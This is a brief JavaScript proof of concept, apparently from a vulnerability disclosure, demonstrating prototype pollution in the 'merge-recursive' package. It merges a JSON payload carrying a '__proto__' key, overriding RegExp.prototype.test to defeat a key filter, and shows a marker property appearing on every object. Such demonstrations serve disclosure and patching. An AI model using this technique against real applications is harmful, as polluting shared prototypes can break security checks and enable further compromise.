RegExp.prototype.test = () => true;
const merge = require('merge-recursive').recursive;
const malicious_payload = '{"__proto__":{"polluted":"yes"}}';
obj = {};
console.log({}.polluted);
merge({}, JSON.parse(malicious_payload));
console.log({}.polluted);